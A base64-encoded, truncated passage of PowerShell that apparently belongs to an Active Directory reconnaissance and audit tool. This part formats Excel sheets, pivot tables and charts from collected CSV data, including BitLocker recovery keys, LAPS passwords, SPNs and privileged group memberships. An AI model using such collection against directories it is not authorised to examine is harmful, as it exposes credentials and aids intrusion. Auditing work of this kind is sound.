yaXR5c3RhbmRhcmRzLm9yZy9kb2N1bWVudF9saWJyYXJ5P2NhdGVnb3J5PXBjaWRzcyZkb2N1bWVudD1wY2lfZHNzIiwgIiIgLCAiIiwgIlBDSSBEU1MgdjMuMi4xIikgfCBPdXQtTnVsbAogICAgICAgICAgICAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkh5cGVybGlua3MuQWRkKCR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuQ2VsbHMuSXRlbSgxLDYpICwgImh0dHBzOi8vYWNzYy5nb3YuYXUvaW5mb3NlYy9pc20vIiwgIiIgLCAiIiwgIjIwMTggSVNNIENvbnRyb2xzIikgfCBPdXQtTnVsbAogICAgICAgICAgICAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkh5cGVybGlua3MuQWRkKCR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuQ2VsbHMuSXRlbSgxLDcpICwgImh0dHBzOi8vd3d3LmNpc2VjdXJpdHkub3JnL2JlbmNobWFyay9taWNyb3NvZnRfd2luZG93c19zZXJ2ZXIvIiwgIiIgLCAiIiwgIkNJUyBCZW5jaG1hcmsgMjAxNiIpIHwgT3V0LU51bGwKCiAgICAgICAgICAgICRleGNlbC5TY3JlZW5VcGRhdGluZyA9ICR0cnVlCiAgICAgICAgICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkd29ya3NoZWV0CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSB3b3Jrc2hlZXQKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdEb21haW5Db250cm9sbGVycy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiRG9tYWluIENvbnRyb2xsZXJzIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdEQUNMcy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiREFDTHMiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ1NBQ0xzLmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJTQUNMcyIKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsSW1wb3J0IC1BREZpbGVOYW1lICRBREZpbGVOYW1lCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZpbGVOYW1lCiAgICAgICAgfQoKICAgICAgICAkQURGaWxlTmFtZSA9IC1qb2luKCRSZXBvcnRQYXRoLCdcJywnR1BPcy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiR1BPcyIKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsSW1wb3J0IC1BREZpbGVOYW1lICRBREZpbGVOYW1lCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZpbGVOYW1lCiAgICAgICAgfQoKICAgICAgICAkQURGaWxlTmFtZSA9IC1qb2luKCRSZXBvcnRQYXRoLCdcJywnZ1BMaW5rcy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiZ1BMaW5rcyIKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsSW1wb3J0IC1BREZpbGVOYW1lICRBREZpbGVOYW1lCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZpbGVOYW1lCiAgICAgICAgfQoKICAgICAgICAkQURGaWxlTmFtZSA9IC1qb2luKCRSZXBvcnRQYXRoLCdcJywnRE5TTm9kZXMnLCcuY3N2JykKICAgICAgICBJZiAoVGVzdC1QYXRoICRBREZpbGVOYW1lKQogICAgICAgIHsKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsV29ya2Jvb2sgLU5hbWUgIkROUyBSZWNvcmRzIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdETlNab25lcy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiRE5TIFpvbmVzIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdQcmludGVycy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiUHJpbnRlcnMiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ0JpdExvY2tlclJlY292ZXJ5S2V5cy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiQml0TG9ja2VyIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdMQVBTLmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJMQVBTIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdDb21wdXRlclNQTnMuY3N2JykKICAgICAgICBJZiAoVGVzdC1QYXRoICRBREZpbGVOYW1lKQogICAgICAgIHsKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsV29ya2Jvb2sgLU5hbWUgIkNvbXB1dGVyIFNQTnMiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQoKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsU29ydCAtQ29sdW1uTmFtZSAiTmFtZSIKICAgICAgICB9CgogICAgICAgICRBREZpbGVOYW1lID0gLWpvaW4oJFJlcG9ydFBhdGgsJ1wnLCdDb21wdXRlcnMuY3N2JykKICAgICAgICBJZiAoVGVzdC1QYXRoICRBREZpbGVOYW1lKQogICAgICAgIHsKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsV29ya2Jvb2sgLU5hbWUgIkNvbXB1dGVycyIKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsSW1wb3J0IC1BREZpbGVOYW1lICRBREZpbGVOYW1lCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZpbGVOYW1lCgogICAgICAgICAgICBHZXQtQURSRXhjZWxTb3J0IC1Db2x1bW5OYW1lICJVc2VyTmFtZSIKCiAgICAgICAgICAgICR3b3Jrc2hlZXQgPSAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpCiAgICAgICAgICAgICMgRnJlZXplIEZpcnN0IFJvdyBhbmQgQ29sdW1uCiAgICAgICAgICAgICR3b3Jrc2hlZXQuU2VsZWN0KCkKICAgICAgICAgICAgJHdvcmtzaGVldC5BcHBsaWNhdGlvbi5BY3RpdmVXaW5kb3cuc3BsaXRjb2x1bW4gPSAxCiAgICAgICAgICAgICR3b3Jrc2hlZXQuQXBwbGljYXRpb24uQWN0aXZlV2luZG93LnNwbGl0cm93ID0gMQogICAgICAgICAgICAkd29ya3NoZWV0LkFwcGxpY2F0aW9uLkFjdGl2ZVdpbmRvdy5GcmVlemVQYW5lcyA9ICR0cnVlCgogICAgICAgICAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJHdvcmtzaGVldAogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgd29ya3NoZWV0CiAgICAgICAgfQoKICAgICAgICAkQURGaWxlTmFtZSA9IC1qb2luKCRSZXBvcnRQYXRoLCdcJywnT1VzLmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJPVXMiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ1VzZXJTUE5zLmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJVc2VyIFNQTnMiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbEltcG9ydCAtQURGaWxlTmFtZSAkQURGaWxlTmFtZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ0dyb3Vwcy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiR3JvdXBzIgogICAgICAgICAgICBHZXQtQURSRXhjZWxJbXBvcnQgLUFERmlsZU5hbWUgJEFERmlsZU5hbWUKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKCiAgICAgICAgICAgIEdldC1BRFJFeGNlbFNvcnQgLUNvbHVtbk5hbWUgIkRpc3Rpbmd1aXNoZWROYW1lIgogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ0dyb3VwTWVtYmVycy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiR3JvdXAgTWVtYmVycyIKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsSW1wb3J0IC1BREZpbGVOYW1lICRBREZpbGVOYW1lCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZpbGVOYW1lCgogICAgICAgICAgICBHZXQtQURSRXhjZWxTb3J0IC1Db2x1bW5OYW1lICJHcm91cCBOYW1lIgogICAgICAgIH0KCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ1VzZXJzLmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJVc2VycyIKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsSW1wb3J0IC1BREZpbGVOYW1lICRBREZpbGVOYW1lCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREZpbGVOYW1lCgogICAgICAgICAgICBHZXQtQURSRXhjZWxTb3J0IC1Db2x1bW5OYW1lICJVc2VyTmFtZSIKCiAgICAgICAgICAgICR3b3Jrc2hlZXQgPSAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpCgogICAgICAgICAgICAjIEZyZWV6ZSBGaXJzdCBSb3cgYW5kIENvbHVtbgogICAgICAgICAgICAkd29ya3NoZWV0LlNlbGVjdCgpCiAgICAgICAgICAgICR3b3Jrc2hlZXQuQXBwbGljYXRpb24uQWN0aXZlV2luZG93LnNwbGl0Y29sdW1uID0gMQogICAgICAgICAgICAkd29ya3NoZWV0LkFwcGxpY2F0aW9uLkFjdGl2ZVdpbmRvdy5zcGxpdHJvdyA9IDEKICAgICAgICAgICAgJHdvcmtzaGVldC5BcHBsaWNhdGlvbi5BY3RpdmVXaW5kb3cuRnJlZXplUGFuZXMgPSAkdHJ1ZQoKICAgICAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKDEsMykuSW50ZXJpb3IuQ29sb3JJbmRleCA9IDUKICAgICAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKDEsMykuZm9udC5Db2xvckluZGV4ID0gMgogICAgICAgICAgICAjIFNldCBGaWx0ZXIgdG8gRW5hYmxlZCBBY2NvdW50cyBvbmx5CiAgICAgICAgICAgICR3b3Jrc2hlZXQuVXNlZFJhbmdlLlNlbGVjdCgpIHwgT3V0LU51bGwKICAgICAgICAgICAgJGV4Y2VsLlNlbGVjdGlvbi5BdXRvRmlsdGVyKDMsJHRydWUpIHwgT3V0LU51bGwKICAgICAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKDEsMSkuU2VsZWN0KCkgfCBPdXQtTnVsbAogICAgICAgICAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJHdvcmtzaGVldAogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgd29ya3NoZWV0CiAgICAgICAgfQoKICAgICAgICAjIENvbXB1dGVyIFJvbGUgU3RhdHMKICAgICAgICAkQURGaWxlTmFtZSA9IC1qb2luKCRSZXBvcnRQYXRoLCdcJywnQ29tcHV0ZXJTUE5zLmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJDb21wdXRlciBSb2xlIFN0YXRzIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQoKICAgICAgICAgICAgJHdvcmtzaGVldCA9ICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkKICAgICAgICAgICAgJFBpdm90VGFibGVOYW1lID0gIkNvbXB1dGVyIFNQTnMiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbFBpdm90VGFibGUgLVNyY1NoZWV0TmFtZSAiQ29tcHV0ZXIgU1BOcyIgLVBpdm90VGFibGVOYW1lICRQaXZvdFRhYmxlTmFtZSAtUGl2b3RSb3dzIEAoIlNlcnZpY2UiKSAtUGl2b3RWYWx1ZXMgQCgiU2VydmljZSIpCgogICAgICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oMSwxKSA9ICJDb21wdXRlciBSb2xlIgogICAgICAgICAgICAkd29ya3NoZWV0LkNlbGxzLkl0ZW0oMSwyKSA9ICJDb3VudCIKCiAgICAgICAgICAgICMgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvdmJhL2V4Y2VsLXZiYS9hcnRpY2xlcy94bHNvcnRvcmRlci1lbnVtZXJhdGlvbi1leGNlbAogICAgICAgICAgICAkd29ya3NoZWV0LlBpdm90VGFibGVzKCRQaXZvdFRhYmxlTmFtZSkuUGl2b3RGaWVsZHMoIlNlcnZpY2UiKS5BdXRvU29ydChbTWljcm9zb2Z0Lk9mZmljZS5JbnRlcm9wLkV4Y2VsLlhsU29ydE9yZGVyXTo6eGxEZXNjZW5kaW5nLCJDb3VudCIpCgogICAgICAgICAgICBHZXQtQURSRXhjZWxDaGFydCAtQ2hhcnRUeXBlICJ4bENvbHVtbkNsdXN0ZXJlZCIgLUNoYXJ0TGF5b3V0IDEwIC1DaGFydFRpdGxlICJDb21wdXRlciBSb2xlcyBpbiBBRCIgLVJhbmdldG9Db3ZlciAiRDI6VTE2IgogICAgICAgICAgICAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkh5cGVybGlua3MuQWRkKCR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkuQ2VsbHMuSXRlbSgxLDQpICwgIiIgLCAiJ0NvbXB1dGVyIFNQTnMnIUExIiwgIiIsICJSYXcgRGF0YSIpIHwgT3V0LU51bGwKICAgICAgICAgICAgJGV4Y2VsLldpbmRvd3MuSXRlbSgxKS5EaXNwbGF5Z3JpZGxpbmVzID0gJGZhbHNlCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBQaXZvdFRhYmxlTmFtZQoKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZSAtQ29tT2JqdG9SZWxlYXNlICR3b3Jrc2hlZXQKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIHdvcmtzaGVldAogICAgICAgIH0KCiAgICAgICAgIyBPcGVyYXRpbmcgU3lzdGVtIFN0YXRzCiAgICAgICAgJEFERmlsZU5hbWUgPSAtam9pbigkUmVwb3J0UGF0aCwnXCcsJ0NvbXB1dGVycy5jc3YnKQogICAgICAgIElmIChUZXN0LVBhdGggJEFERmlsZU5hbWUpCiAgICAgICAgewogICAgICAgICAgICBHZXQtQURSRXhjZWxXb3JrYm9vayAtTmFtZSAiT3BlcmF0aW5nIFN5c3RlbSBTdGF0cyIKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERmlsZU5hbWUKCiAgICAgICAgICAgICR3b3Jrc2hlZXQgPSAkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpCiAgICAgICAgICAgICRQaXZvdFRhYmxlTmFtZSA9ICJPcGVyYXRpbmcgU3lzdGVtcyIKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsUGl2b3RUYWJsZSAtU3JjU2hlZXROYW1lICJDb21wdXRlcnMiIC1QaXZvdFRhYmxlTmFtZSAkUGl2b3RUYWJsZU5hbWUgLVBpdm90Um93cyBAKCJPcGVyYXRpbmcgU3lzdGVtIikgLVBpdm90VmFsdWVzIEAoIk9wZXJhdGluZyBTeXN0ZW0iKQoKICAgICAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKDEsMSkgPSAiT3BlcmF0aW5nIFN5c3RlbSIKICAgICAgICAgICAgJHdvcmtzaGVldC5DZWxscy5JdGVtKDEsMikgPSAiQ291bnQiCgogICAgICAgICAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL3ZiYS9leGNlbC12YmEvYXJ0aWNsZXMveGxzb3J0b3JkZXItZW51bWVyYXRpb24tZXhjZWwKICAgICAgICAgICAgJHdvcmtzaGVldC5QaXZvdFRhYmxlcygkUGl2b3RUYWJsZU5hbWUpLlBpdm90RmllbGRzKCJPcGVyYXRpbmcgU3lzdGVtIikuQXV0b1NvcnQoW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbFNvcnRPcmRlcl06OnhsRGVzY2VuZGluZywiQ291bnQiKQoKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsQ2hhcnQgLUNoYXJ0VHlwZSAieGxDb2x1bW5DbHVzdGVyZWQiIC1DaGFydExheW91dCAxMCAtQ2hhcnRUaXRsZSAiT3BlcmF0aW5nIFN5c3RlbXMgaW4gQUQiIC1SYW5nZXRvQ292ZXIgIkQyOlMxNiIKICAgICAgICAgICAgJHdvcmtib29rLldvcmtzaGVldHMuSXRlbSgxKS5IeXBlcmxpbmtzLkFkZCgkd29ya2Jvb2suV29ya3NoZWV0cy5JdGVtKDEpLkNlbGxzLkl0ZW0oMSw0KSAsICIiICwgIkNvbXB1dGVycyFBMSIsICIiLCAiUmF3IERhdGEiKSB8IE91dC1OdWxsCiAgICAgICAgICAgICRleGNlbC5XaW5kb3dzLkl0ZW0oMSkuRGlzcGxheWdyaWRsaW5lcyA9ICRmYWxzZQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgUGl2b3RUYWJsZU5hbWUKCiAgICAgICAgICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkd29ya3NoZWV0CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSB3b3Jrc2hlZXQKICAgICAgICB9CgogICAgICAgICMgR3JvdXAgU3RhdHMKICAgICAgICAkQURGaWxlTmFtZSA9IC1qb2luKCRSZXBvcnRQYXRoLCdcJywnR3JvdXBNZW1iZXJzLmNzdicpCiAgICAgICAgSWYgKFRlc3QtUGF0aCAkQURGaWxlTmFtZSkKICAgICAgICB7CiAgICAgICAgICAgIEdldC1BRFJFeGNlbFdvcmtib29rIC1OYW1lICJQcml2aWxlZ2VkIEdyb3VwIFN0YXRzIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURGaWxlTmFtZQoKICAgICAgICAgICAgJHdvcmtzaGVldCA9ICR3b3JrYm9vay5Xb3Jrc2hlZXRzLkl0ZW0oMSkKICAgICAgICAgICAgJFBpdm90VGFibGVOYW1lID0gIkdyb3VwIE1lbWJlcnMiCiAgICAgICAgICAgIEdldC1BRFJFeGNlbFBpdm90VGFibGUgLVNyY1NoZWV0TmFtZSAiR3JvdXAgTWVtYmVycyIgLVBpdm90VGFibGVOYW1lICRQaXZvdFRhYmxlTmFtZSAtUGl2b3RSb3dzIEAoIkdyb3VwIE5hbWUiKS1QaXZvdEZpbHRlcnMgQCgiQWNjb3VudFR5cGUiKSAtUGl2b3RWYWx1ZXMgQCgiQWNjb3VudFR5cGUiKQoKICAgICAgICAgICAgIyBTZXQgdGhlIGZpbHRlcgogICAgICAgICAgICAkd29ya3NoZWV0LlBpdm90VGFibGVzKCRQaXZvdFRhYmxlTmFtZSkuUGl2b3RGaWVsZHMoIkFjY291bnRUeXBlIikuQ3VycmVudFBhZ2UgPSAidXNlciIKCiAgICAgICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgxLDIpLkludGVyaW9yLkNvbG9ySW5kZXggPSA1CiAgICAgICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgxLDIpLmZvbnQuQ29sb3JJbmRleCA9IDIKCiAgICAgICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgzLDEpID0gIkdyb3VwIE5hbWUiCiAgICAgICAgICAgICR3b3Jrc2hlZXQuQ2VsbHMuSXRlbSgzLDIpID0gIkNvdW50IChOb3QtUmVjdXJzaXZlKSIKCiAgICAgICAgICAgICRleGNlbC5TY3JlZW5VcGRhdGluZyA9ICRmYWxzZQogICAgICAgICAgICAjIENyZWF0ZSBhIGNvcHkgb2YgdGhlIFBpdm90IFRhYmxlCiAgICAgICAgICAgICRQaXZvdFRhYmxlVGVtcCA9ICgkd29ya2Jvb2suUGl2b3RDYWNoZXMoKS5JdGVtKCR3b3JrYm9vay5QaXZvdENhY2hlcygpLkNvdW50KSkuQ3JlYXRlUGl2b3RUYWJsZSgiUjFDNSIsIlBpdm90VGFibGVUZW1wIikKICAgICAgICAgICAgJFBpdm90RmllbGRUZW1wID0gJFBpdm90VGFibGVUZW1wLlBpdm90RmllbGRzKCJHcm91cCBOYW1lIikKICAgICAgICAgICAgIyBTZXQgYSBmaWx0ZXIKICAgICAgICAgICAgJFBpdm90RmllbGRUZW1wLk9yaWVudGF0aW9uID0gW01pY3Jvc29mdC5PZmZpY2UuSW50ZXJvcC5FeGNlbC5YbFBpdm90RmllbGRPcmllbnRhdGlvbl06OnhsUGFnZUZpZWxkCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUGl2b3RGaWVsZFRlbXAuQ3VycmVudFBhZ2UgPSAiRG9tYWluIEFkbWlucyIKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjIE5vIERpcmVjdCBEb21haW4gQWRtaW5zLiBHb29kIEpvYiEKICAgICAgICAgICAgICAgICROb0RBID0gJHRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBJZiAoJE5vREEpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQaXZvdEZpZWxkVGVtcC5DdXJyZW50UGFnZSA9ICJBZG1pbmlzdHJhdG9ycyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIyBObyBEaXJlY3QgQWRtaW5pc3RyYXRvcnMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAjIENyZWF0ZSBhIFNsaWNlcgogICAgICAgICAgICAkUGl2b3RTbGljZXIgPSAkd29ya2Jvb2suU2xpY2VyQ2FjaGVzLkFkZCgkUGl2b3RUYWJsZVRlbXAsJFBpdm90RmllbGRUZW1wKQogICAgICAgICAgICAjIEFkZCBPcmlnaW5hbCBQaXZvdCBUYWJsZSB0byB0aGUgU2xpY2VyCiAgICAgICAgICAgICRQaXZvdFNsaWNlci5QaXZvdFRhYmxlcy5BZGRQaXZvdFRhYmxlKCR3b3Jrc2hlZXQuUGl2b3RUYWJsZXMoJFBpdm90VGFibGVOYW1lKSkKICAgICAgICAgICAgIyBEZWxldGUgdGhlIFNsaWNlcgogICAgICAgICAgICAkUGl2b3RTbGljZXIuRGVsZXRlKCkKICAgICAgICAgICAgIyBEZWxldGUgdGhlIFBpdm90IFRhYmxlIENvcHkKICAgICAgICAgICAgJFBpdm90VGFibGVUZW1wLlRhYmxlUmFuZ2UyLkRlbGV0ZSgpIHwgT3V0LU51bGwKCiAgICAgICAgICAgIEdldC1BRFJFeGNlbENvbU9ialJlbGVhc2UgLUNvbU9ianRvUmVsZWFzZSAkUGl2b3RGaWVsZFRlbXAKICAgICAgICAgICAgR2V0LUFEUkV4Y2VsQ29tT2JqUmVsZWFzZSAtQ29tT2JqdG9SZWxlYXNlICRQaXZvdFNsaWNlcgogICAgICAgICAgICBHZXQtQURSRXhjZWxDb21PYmpSZWxlYXNlIC1Db21PYmp0b1JlbGVhc2UgJFBpdm90VGFibGVUZW1wCgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgUGl2b3RGaWVsZFRlbXAKICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIFBpdm90U2xpY2VyCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBQaXZvdFRhYmxlVGVtcAoKICAgICAgICAgICAgIkFjY291bnQgT3BlcmF0b3JzIiwiQWRtaW5pc3RyYXRvcnMiLCJCYWNrdXAgT3BlcmF0b3JzIiwiQ2VydCBQdWJsaXNoZXJzIiwiQ3J5cHRvIE9wZXJhdG9ycyIsIkRuc0FkbWlucyIsIkRvbWFpbiBBZG1pbnMiLCJFbnRlcnByaXNlIEFkbWlucyIsIkVudGVycHJpc2UgS2V5IEFkbWlucyIsIkluY29taW5nIEZvcmVzdCBUcnVzdCBCdWlsZGVycyIsIktleSBBZG1pbnMiLCJNaWNyb3NvZnQgQWR2YW5jZWQgVGhyZWF0IEFuYWx5dGljcyBBZG1pbmlzdHJhdG9ycyIsIk5ldHdvcmsgT3BlcmF0b3JzIiwiUHJpbnQgT3BlcmF0b3JzIiwiUmVtb3RlIERlc2t0b3AgVXNlcnMiLCJTY2hlbWEgQWRtaW5zIiwiU2VydmVyIE9wZXJhdG9ycyIgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgIC